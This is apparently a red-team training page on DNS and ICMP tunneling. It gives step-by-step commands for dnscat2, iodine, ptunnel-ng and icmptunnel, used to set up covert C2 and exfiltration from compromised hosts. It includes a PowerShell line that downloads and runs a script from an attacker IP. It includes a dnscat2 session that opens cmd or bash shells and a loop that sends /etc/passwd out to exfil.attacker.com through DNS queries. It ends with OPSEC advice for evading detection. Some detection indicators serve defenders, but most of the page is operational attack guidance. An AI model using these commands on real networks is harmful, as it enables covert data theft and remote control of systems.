---
layout: training-page
title: "DNS & ICMP Tunneling — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - dns-tunneling
  - dnscat2
  - icmp-tunneling
  - ptunnel-ng
page_key: "pivoting-dns-icmp-tunneling"
render_with_liquid: false
---

# DNS & ICMP Tunneling

## Overview

DNS and ICMP tunneling are covert channel techniques for exfiltrating data or establishing C2 communication through protocols that are rarely inspected by firewalls. DNS tunneling encodes data in DNS query/response records; ICMP tunneling hides data in ping packet payloads. Both are significantly slower than TCP tunneling but can bypass restrictive egress filtering where only DNS (UDP/53) or ICMP is permitted outbound.

![DNS and ICMP covert channel tunneling: pivot host encodes data in DNS queries or ICMP ping payloads through firewall to attacker-controlled nameserver or proxy server](/images/pivoting/dns-icmp-tunnel.svg)  
*// covert channel tunneling — dns and icmp bypass egress filtering*

## DNS Tunneling Concepts

DNS queries can carry arbitrary data in labels and record types (TXT, MX, CNAME). A DNS tunnel encodes TCP data into DNS queries sent to a nameserver you control. The nameserver decodes the queries and forwards the traffic to its destination, responding with encoded data in the DNS reply.

```
# DNS tunnel data flow:
# Client → DNS query (encoded data) → Your NS → Decode → Internet
# Client ← DNS reply (encoded data) ← Your NS ← Encode ← Internet

# Requirements:
# 1. A domain you control (e.g., tunnel.example.com)
# 2. An NS record pointing tunnel.example.com → your server
# 3. dnscat2 server running on your server
# 4. dnscat2 client on the compromised host

# DNS setup (in registrar/DNS provider):
# A    ns1.tunnel.example.com  →  YOUR_SERVER_IP
# NS   tunnel.example.com      →  ns1.tunnel.example.com
```

## dnscat2 — DNS C2 Tunnel

dnscat2 creates an encrypted command-and-control channel over DNS. The server runs on your attack box (acts as the DNS resolver). The client runs on the compromised host and queries your DNS server, encoding session data in DNS labels.

```
># ── Server (Attack Box) ───────────────────────────────────────
# Install dnscat2 server:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Start dnscat2 server:
# Using a registered domain (preferred — traffic looks like real DNS):
sudo ruby dnscat2.rb --dns host=10.10.14.5,port=53,domain=tunnel.example.com --no-cache

# Direct mode (no domain required — client connects directly):
sudo ruby dnscat2.rb --dns host=10.10.14.5,port=53 --no-cache
# Note the pre-shared secret printed at startup

# ── Client (Compromised Host — Linux) ─────────────────────────
# Compile dnscat2 client:
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect using domain (queries go through normal DNS):
./dnscat --dns domain=tunnel.example.com

# Connect directly to server (no domain needed):
./dnscat --dns server=10.10.14.5,port=53 --secret=PRESHARED_SECRET
```

## dnscat2 Session Management

After the client connects, dnscat2 opens an encrypted session. Use the server console to interact with sessions and run commands.

```
># dnscat2 server console commands:
dnscat2> sessions           # list active sessions
dnscat2> session -i 1       # interact with session 1

# Within a session — exec shell:
dnscat2 session 1> shell    # open command shell sub-session
dnscat2 session 2> ?        # help

# Within shell session:
command (session 2)> exec cmd.exe   # Windows shell
command (session 2)> exec /bin/bash # Linux shell

# Port forwarding through dnscat2:
dnscat2 session 1> listen 127.0.0.1:8080 172.16.5.100:80
# Creates local port 8080 that forwards to 172.16.5.100:80 via DNS tunnel

dnscat2 session 1> listen 127.0.0.1:3389 172.16.5.19:3389
# RDP through DNS tunnel (very slow — use sparingly)
```

## dnscat2 on Windows

A PowerShell-based dnscat2 client exists for Windows targets where you can't drop a binary.

```
># PowerShell dnscat2 client:
# https://github.com/lukebaggett/dnscat2-powershell

# Download and execute (on Windows pivot):
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/dnscat2.ps1')
Start-Dnscat2 -DNSserver 10.10.14.5 -Domain tunnel.example.com -PreSharedSecret SECRET -Exec cmd

# Or: Import-Module then call:
Import-Module .\dnscat2.ps1
Start-Dnscat2 -Domain tunnel.example.com -DNSserver 10.10.14.5
```

## ICMP Tunneling — ptunnel-ng

ICMP tunneling encodes TCP data in ICMP echo request/reply packets (ping). Useful when only ICMP is allowed outbound from a network. `ptunnel-ng` is the maintained fork of ptunnel and supports authentication.

```
># Install ptunnel-ng:
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
cmake .
make

# ── Server (Attack Box) ───────────────────────────────────────
# Start ptunnel-ng server (requires root — binds to raw socket):
sudo ./ptunnel-ng -r10.10.14.5 -R22
# -r: server IP (your attack box)
# -R: port to forward to (SSH port 22 on server)

# With authentication (password):
sudo ./ptunnel-ng -r10.10.14.5 -R22 -a 'SecretPassword'

# ── Client (Compromised Host) ─────────────────────────────────
# Connect to ptunnel-ng server:
./ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22
# -p: proxy (server) address
# -l: local port to open
# -r: remote host to reach via server
# -R: remote port

# With authentication:
./ptunnel-ng -p10.10.14.5 -l2222 -r10.10.14.5 -R22 -a 'SecretPassword'

# ── Attack Box ────────────────────────────────────────────────
# SSH through the ICMP tunnel (via local port 2222):
ssh -p 2222 -l ubuntu localhost

# Once SSH is up, create a dynamic forward through the ICMP tunnel:
ssh -D 9050 -p 2222 -l ubuntu localhost
proxychains nmap -sT 172.16.5.0/24
```

## icmptunnel — Alternative ICMP Tunneling

`icmptunnel` creates a full IP tunnel inside ICMP echo packets, assigning actual IP addresses to both ends. It works differently from ptunnel — it's a true IP tunnel rather than port-specific forwarding.

```
# Install icmptunnel:
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make

# ── Server (Attack Box, requires root) ───────────────────────
# Disable ICMP echo replies on the OS (icmptunnel handles them):
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# Start server (assigns 10.0.0.1 to server tunnel interface):
sudo ./icmptunnel -s 10.0.0.1

# ── Client (Pivot Host, requires root) ────────────────────────
# Disable ICMP echo replies:
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

# Connect to server (attack box IP), assign 10.0.0.2 to client:
sudo ./icmptunnel 10.10.14.5
# Then assign IP to the created tun0 interface:
sudo ifconfig tun0 10.0.0.2 netmask 255.255.255.0

# ── Attack Box — use the IP tunnel ────────────────────────────
# SSH from attack box to client's tunnel IP:
ssh ubuntu@10.0.0.2
# Then port forward or SOCKS proxy normally:
ssh -D 9050 ubuntu@10.0.0.2
proxychains nmap -sT 172.16.5.0/24

# Re-enable ICMP echo when done:
echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```

## Iodine — IP-over-DNS Tunnel

Iodine creates a full IP tunnel over DNS, not just a C2 channel. It assigns a real IP to your attack box and the tunnel endpoint, allowing you to run any TCP/UDP application through it without a SOCKS proxy. Slower than dnscat2 for interactive sessions but more flexible for arbitrary traffic.

```
# Requirements: domain with NS record → your server (same as dnscat2)

# DNS record configuration at your registrar:
# Type: A     Name: ns1.tunnel.yourdomain.com   Value: YOUR_SERVER_IP
# Type: NS    Name: tunnel.yourdomain.com        Value: ns1.tunnel.yourdomain.com

# ── Server (Attack Box) ───────────────────────────────────────
sudo apt install iodine
sudo iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com
# -f: foreground
# -c: disable client IP verification (useful if client is behind NAT)
# -P: tunnel password
# 10.0.0.1: IP to assign to the server tunnel interface (dns0)
# Creates: dns0 interface at 10.0.0.1/24

# ── Client (Compromised Host) ─────────────────────────────────
sudo iodine -f -P password tunnel.yourdomain.com
# Connects via DNS to your server
# Creates dns0 interface with IP in 10.0.0.0/24 (assigned by server)
# Typical client IP: 10.0.0.2

# Test connectivity:
ping 10.0.0.1

# ── Attack Box — use the iodine tunnel ────────────────────────
# SSH through the iodine tunnel IP (assigned to client):
ssh ubuntu@10.0.0.2
# Once SSH up, port forward or SOCKS proxy as needed:
ssh -D 9050 ubuntu@10.0.0.2
proxychains nmap -sT 172.16.5.0/24

# Iodine vs dnscat2:
# iodine: real IP tunnel, requires compiled binary, better throughput
# dnscat2: C2 channel + port forward, Ruby server, easier to set up
```

## DNS Exfiltration vs Full DNS Tunnel

DNS exfiltration and full DNS tunneling are operationally distinct techniques. Understanding the difference helps choose the right approach and avoid over-engineering simple scenarios.

```
# DNS Exfiltration (one-way, data out only):
# - Encode sensitive data in DNS query labels
# - Data travels attacker-ward only (in the query name)
# - No server-side response required beyond ACK
# - Example: exfil /etc/passwd via subdomain queries
#   Query: <base64_chunk>.exfil.attacker.com
# - Tools: dnsteal, dns-exfiltrator, manual nslookup loop

# Simple DNS exfil one-liner (Linux):
# Break file into chunks and send as DNS queries:
for chunk in $(cat /etc/passwd | base64 | fold -w 60); do
    nslookup "${chunk}.exfil.attacker.com" 10.10.14.5 > /dev/null 2>&1
done
# Capture with tcpdump on attack box:
sudo tcpdump -n -i eth0 udp port 53 -w dns-capture.pcap

# Full DNS Tunnel (bidirectional, full IP/TCP):
# - Bidirectional channel — data flows in both directions
# - Enables full interactive sessions (shell, RDP, etc.)
# - Requires controlled DNS server + domain delegation
# - Tools: dnscat2, iodine, dns2tcp
# - Much higher overhead than exfil-only (2-way DNS overhead)

# When to use which:
# → Steal credentials/keys quickly: DNS exfiltration
# → Need interactive C2, no TCP/HTTP egress: dnscat2 tunnel
# → Need full IP tunnel (all protocols): iodine
# → Corporate environment with DNS inspection: stick to short labels, avoid TXT
```

## DNS Tunnel Through Corporate Resolver (Split-Horizon DNS)

Corporate environments often use a split-horizon DNS setup where internal resolvers only forward certain domains externally. Tunneling must account for this.

```
# Problem: Corporate DNS server only resolves internal names + approved externals.
# Your tunnel domain may not be resolvable if the corporate resolver blocks unknown NS.

# Test whether your tunnel domain resolves through corporate DNS:
nslookup tunnel.yourdomain.com 172.16.5.1
# If SERVFAIL or NXDOMAIN — corporate resolver is blocking it

# Option 1: Use direct IP mode (dnscat2 without domain delegation)
# Route queries directly to your DNS server IP, bypassing corporate resolver:
./dnscat --dns server=10.10.14.5,port=53 --secret=SECRET
# Works only if UDP/53 to external IPs is allowed (not just to internal DNS)

# Option 2: Test DNS egress from pivot (what can reach external DNS?)
# Check if UDP/53 outbound to 8.8.8.8 is allowed:
nslookup google.com 8.8.8.8
# If this resolves — direct UDP/53 is open, use direct server mode

# Option 3: Use DNS over alternate port (if only port 53 to corp resolver is allowed)
# dnscat2 server on non-standard port + ProxyCommand via HTTP:
# (combine with Chisel HTTP tunnel for the outer transport)

# Option 4: Use DNS subdomain relay
# Register your NS and configure corporate DNS to forward your subdomain
# (requires social engineering or insider access — rarely practical in red team)

# Check corporate resolver configuration:
cat /etc/resolv.conf
# If nameserver points to internal IP (e.g., 172.16.5.1), that's the split-horizon resolver
```

## Detection: DNS Tunneling Indicators

Defenders and blue teams look for specific patterns. Understanding these helps calibrate your operational footprint.

```
# High-volume DNS query indicators:
# - Single host generating 100s-1000s of DNS queries per minute
# - Normal DNS: 10-100 queries/minute per host; tunnel: 500-5000+
# - Monitor: DNS server query logs, NetFlow data

# Long subdomain labels (dnscat2 encodes 60-byte base32 chunks):
# Normal DNS label: "mail.corp.com"
# Tunnel DNS label: "A4B2C3D4E5F6A7B8C9D0.tunnel.attacker.com"
# Detection: query length > 30 chars per label is suspicious

# Record type abuse:
# - TXT record queries from internal hosts to external domains
# - NULL record queries (used by older DNS tunnel tools)
# - MX queries not originating from mail servers
# - High ratio of TXT/NULL/CNAME queries vs A queries

# Entropy analysis:
# Normal DNS names have low entropy (readable words)
# Encoded tunnel data has high entropy (looks random/base64)
# Tools like RITA, Zeek's DNS analyzer, or Splunk can flag high-entropy subdomains

# SIEM/detection rule indicators:
# - Same host → same domain → >1000 queries/hour
# - Query name length > 100 characters total
# - Non-A record type queries to external domains from workstations
# - DNS query to newly registered domain (less than 7 days old)

# OPSEC countermeasures:
# - Slow the query rate (dnscat2 has --max-retransmits and timing options)
# - Use common-looking subdomain prefixes
# - Avoid TXT records — use A records with encoded data in IP fields
# - Keep sessions short and remove client binary immediately after use
```

## Performance Notes and Detection

DNS and ICMP tunnels are significantly slower than TCP-based tunnels. Use them only when no other option exists. Both are detectable by anomaly-based inspection.

```
># DNS tunneling detection indicators:
# - Unusually long DNS query labels (dnscat encodes in labels up to 63 chars)
# - High volume of DNS TXT/NULL record queries
# - DNS queries to unusual or newly registered domains
# - Single host generating disproportionate DNS query volume

# ICMP tunneling detection indicators:
# - ICMP packets with unusually large payloads (>64 bytes)
# - ICMP packets with non-standard payload content (not zeros/pattern)
# - High ICMP volume from internal host
# - ICMP to single external IP at regular intervals

# Bandwidth expectations:
# DNS tunnel:  ~3 KB/s usable (limited by DNS query rate + encoding overhead)
# ICMP tunnel: ~1-4 KB/s depending on kernel and network path

# Operational recommendation:
# Use DNS/ICMP tunneling only for:
# - C2 keep-alive when TCP is blocked
# - Small data exfil (credentials, keys, configs)
# - Session setup — then switch to faster protocol
# Avoid for: large transfers, interactive tools requiring low latency
```

## Resources

- dnscat2 — https://github.com/iagox86/dnscat2
- dnscat2-powershell — https://github.com/lukebaggett/dnscat2-powershell
- iodine — https://code.kryo.se/iodine/
- ptunnel-ng — https://github.com/utoni/ptunnel-ng
- icmptunnel — https://github.com/jamesbarlow/icmptunnel
- MITRE T1071.004 — Application Layer Protocol: DNS
- MITRE T1572 — Protocol Tunneling
- MITRE T1048 — Exfiltration Over Alternative Protocol
